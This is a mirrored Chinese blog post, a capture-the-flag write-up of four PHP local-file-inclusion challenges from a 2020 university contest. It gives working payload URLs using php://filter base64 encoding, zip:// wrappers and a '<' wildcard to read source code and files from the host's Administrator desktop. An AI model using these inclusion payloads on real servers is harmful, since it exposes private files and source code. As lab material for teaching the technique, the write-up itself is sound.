<!--yml
category: 未分类
date: 2022-04-26 14:44:17
-->

# 西邮ctf2020 web之文件包含解析_落雪wink的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_44145452/article/details/109498277](https://blog.csdn.net/weixin_44145452/article/details/109498277)

## 比赛地址：`http://39.97.182.97/`

这四道考题都是利用的php伪协议 参考[php伪协议，利用文件包含漏洞](https://blog.csdn.net/qq_41289254/article/details/81388343?utm_source=app)

![在这里插入图片描述](img/8200724fd5787d9c83a65ec9a6f93911.png)直接构造

```
http://watcem.top/wangzhan/27.php?file=flag.txt 
```

得到flag
![在这里插入图片描述](img/189e57e7064f59606258a3299ccd6b85.png)

![在这里插入图片描述](img/8b4eed8765a6e0c2b5f86aa3022d37ae.png)
尝试构造 http://watcem.top/wangzhan/26.php?file=flag.php
发现需要用base64来解码
![在这里插入图片描述](img/ab2b45f40af5b02cbfd214cf470b51de.png)使用php://filter构造

```
http://watcem.top/wangzhan/26.php?file=php://filter/read=convert.base64-encode/resource=flag.php 
```

得到base64加密过的字符串
![在这里插入图片描述](img/6f482dbc1763c4fa8c15b5f67d31c6a4.png)
base64解密得到flag
flag{fa8a8853b970c0f82bda58648ce1292a}

这题好**难 刚开始做没思路还是问的大佬才写出来

![在这里插入图片描述](img/5de52c1b41d4dec9133d70a69e764858.png)题中提示flag在桌面，然后试图构造桌面路径

```
http://watcem.top/ctf/2/2.php?file=C:\Users\Administrator\Desktop\flag.< 
```

之后在页面上发现回显，是.7z文件
![在这里插入图片描述](img/7f34699f42769ac3671604376ad8b5c8.png)

注：这里有一个知识点 PHP中的(<) 相当于通配符符号(*)
![在这里插入图片描述](img/92aea7d3c227d5bd6da2a551f3226cc5.png)确定是.7z文件后，重新构造url

```
http://watcem.top/ctf/2/2.php?file=zip://C:\Users\Administrator\Desktop\flag.zip%23flag.txt 
```

%23是#，经过转义在win上就要用%23
得到flag
![在这里插入图片描述](img/576655f5984d31b391b919f98d37ed16.png)我好菜阿巴阿巴

发现页面是这个，甜甜的文件- -
![在这里插入图片描述](img/89de6324fbf6954c4fedf8423cca59cc.png)

2333太甜了
![在这里插入图片描述](img/457d4ad64f75df98e7d0cbab61c67148.png)构造 查找在桌面上的含有flag的文件

```
http://watcem.top/ctf/3/3.php?file=C:\Users\Administrator\Desktop\flag.< 
```

得到回显 可以看到l.7z文件中含有flag.txt文本
![在这里插入图片描述](img/03a925b26add8e043a5e4115de58e35b.png)再构造，尝试打开flag.txt
构造一个发现没反应http://watcem.top/ctf/3/3.php?file=C:\Users\Administrator\Desktop\flag.7z%23flag.txt
试试base64解码

```
http://watcem.top/ctf/3/3.php?file=php://filter/convert.base64-encode/resource=file://C:\Users\Administrator\Desktop\flag.7z 
```

页面下方显示一串字符~

```
N3q8ryccAATAe6mrIAAAAAAAAABqAAAAAAAAADAECf7cQ+YDVIG3ANMRbxs5ucbqTnBjZLGyzsSyPyqWlpRLnwEEBgABCSAABwsBAAIkBvEHAQpTB+KCpw0d1h3bISEBAAEADBgUAAgKAbRFbLcAAAUBGQkAAAAAAAAAAAAREwBmAGwAYQBnAC4AdAB4AHQAAAAZABQKAQDAKZRq7KbWARUGAQAgAAAAAAA= 
```

base64解码发现没解出来，艹（一种植物）
把他们扔到010editor中，使用DecodeBase64脚本解码
![在这里插入图片描述](img/5b5d11e915d036f94dd93ffb55be1377.png)保存为1.7z 打开发现有密码
![在这里插入图片描述](img/6d055b87d6cb196e2a48c8ad6e78b180.png)看题上提示是3位数 纯数字密码，随便试下发现密码是123，当然也可以爆破 打开flag.txt 得到flag
![在这里插入图片描述](img/a93933d0f445e5c4825f682507191e0e.png)
题太难了，我是five，本人很菜，如果有写的不对的地方欢迎大佬们评论区留言指正
参考链接：[https://www.cnblogs.com/-mo-/p/11736445.html](https://www.cnblogs.com/-mo-/p/11736445.html)
[https://blog.csdn.net/qq_41289254/article/details/81388343?utm_source=app](https://blog.csdn.net/qq_41289254/article/details/81388343?utm_source=app)